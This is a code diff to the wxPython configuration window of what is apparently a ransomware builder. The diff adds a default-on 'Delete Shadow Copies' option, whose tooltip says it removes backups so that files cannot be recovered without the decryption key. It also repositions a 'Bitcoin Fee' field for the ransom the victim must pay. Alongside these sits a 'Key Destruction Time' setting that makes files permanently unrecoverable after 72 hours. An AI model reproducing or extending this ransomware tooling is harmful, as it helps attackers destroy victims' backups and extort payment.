@@ -302,46 +302,46 @@ class MainFrame ( wx.Frame ):
 		
 		bSizer411 = wx.BoxSizer( wx.HORIZONTAL )
 		
-		bSizer203212 = wx.BoxSizer( wx.HORIZONTAL )
+		bSizer2032131 = wx.BoxSizer( wx.HORIZONTAL )
 		
-		self.BitcoinFeeLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Bitcoin Fee", wx.DefaultPosition, wx.DefaultSize, 0 )
-		self.BitcoinFeeLabel.Wrap( -1 )
-		self.BitcoinFeeLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
-		self.BitcoinFeeLabel.SetToolTipString( u"The Bitcoin Fee that you want to victim to pay. This amount will be shown in the GUI. Defaults to 1.0" )
+		self.DeleteShadowCopiesLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Delete Shadow Copies", wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.DeleteShadowCopiesLabel.Wrap( -1 )
+		self.DeleteShadowCopiesLabel.SetToolTipString( u"If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine's files and can be used to gain access to the encrypted data without the decryption key." )
 		
-		bSizer203212.Add( self.BitcoinFeeLabel, 0, wx.ALL|wx.TOP, 7 )
-		
-		
-		bSizer203212.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
-		
-		self.BitcoinFeeTextCtrl = wx.TextCtrl( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
-		self.BitcoinFeeTextCtrl.SetToolTipString( u"The Bitcoin Fee that you want to victim to pay. This amount will be shown in the GUI. Defaults to 1.0" )
-		
-		bSizer203212.Add( self.BitcoinFeeTextCtrl, 0, wx.ALL, 5 )
+		bSizer2032131.Add( self.DeleteShadowCopiesLabel, 0, wx.ALL, 5 )
 		
 		
-		bSizer411.Add( bSizer203212, 1, wx.EXPAND, 5 )
+		bSizer2032131.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
 		
-		bSizer2032111 = wx.BoxSizer( wx.HORIZONTAL )
+		self.DeleteShadowCopiesCheckbox = wx.CheckBox( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.DeleteShadowCopiesCheckbox.SetValue(True) 
+		self.DeleteShadowCopiesCheckbox.SetToolTipString( u"If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine's files and can be used to gain access to the encrypted data without the decryption key." )
+		
+		bSizer2032131.Add( self.DeleteShadowCopiesCheckbox, 0, wx.ALL, 5 )
+		
+		
+		bSizer411.Add( bSizer2032131, 1, wx.EXPAND, 5 )
+		
+		bSizer20321112 = wx.BoxSizer( wx.HORIZONTAL )
 		
 		self.KeyDestructionTimeLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Key Destruction Time (s)", wx.DefaultPosition, wx.DefaultSize, 0 )
 		self.KeyDestructionTimeLabel.Wrap( -1 )
 		self.KeyDestructionTimeLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
 		self.KeyDestructionTimeLabel.SetToolTipString( u"The time in seconds before the victim's decryption key is destroyed. Once the time runs out, the victim will no longer be able to decrypt their files. Defaults to 259200 (72 hours)" )
 		
-		bSizer2032111.Add( self.KeyDestructionTimeLabel, 0, wx.ALL|wx.TOP, 7 )
+		bSizer20321112.Add( self.KeyDestructionTimeLabel, 0, wx.ALL|wx.TOP, 7 )
 		
 		
-		bSizer2032111.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
+		bSizer20321112.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
 		
 		self.KeyDestructionTimeTextCtrl = wx.TextCtrl( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
 		self.KeyDestructionTimeTextCtrl.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_WINDOWTEXT ) )
 		self.KeyDestructionTimeTextCtrl.SetToolTipString( u"The time in seconds before the victim's decryption key is destroyed. Once the time runs out, the victim will no longer be able to decrypt their files. Defaults to 259200 (72 hours)" )
 		
-		bSizer2032111.Add( self.KeyDestructionTimeTextCtrl, 0, wx.ALL, 5 )
+		bSizer20321112.Add( self.KeyDestructionTimeTextCtrl, 0, wx.ALL, 5 )
 		
 		
-		bSizer411.Add( bSizer2032111, 1, wx.EXPAND, 5 )
+		bSizer411.Add( bSizer20321112, 1, wx.EXPAND, 5 )
 		
 		
 		sbSizer13.Add( bSizer411, 1, wx.EXPAND, 5 )
@@ -368,13 +368,25 @@ class MainFrame ( wx.Frame ):
 		
 		bSizer412.Add( bSizer2032112, 1, wx.EXPAND, 5 )
 		
-		bSizer203213 = wx.BoxSizer( wx.HORIZONTAL )
+		bSizer203212 = wx.BoxSizer( wx.HORIZONTAL )
+		
+		self.BitcoinFeeLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Bitcoin Fee", wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.BitcoinFeeLabel.Wrap( -1 )
+		self.BitcoinFeeLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
+		self.BitcoinFeeLabel.SetToolTipString( u"The Bitcoin Fee that you want to victim to pay. This amount will be shown in the GUI. Defaults to 1.0" )
+		
+		bSizer203212.Add( self.BitcoinFeeLabel, 0, wx.ALL|wx.TOP, 7 )
 		
 		
-		bSizer203213.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
+		bSizer203212.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
+		
+		self.BitcoinFeeTextCtrl = wx.TextCtrl( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.BitcoinFeeTextCtrl.SetToolTipString( u"The Bitcoin Fee that you want to victim to pay. This amount will be shown in the GUI. Defaults to 1.0" )
+		
+		bSizer203212.Add( self.BitcoinFeeTextCtrl, 0, wx.ALL, 5 )
 		
 		
-		bSizer412.Add( bSizer203213, 1, wx.EXPAND, 5 )
+		bSizer412.Add( bSizer203212, 1, wx.EXPAND, 5 )
 		
 		
 		sbSizer13.Add( bSizer412, 1, wx.EXPAND, 5 )
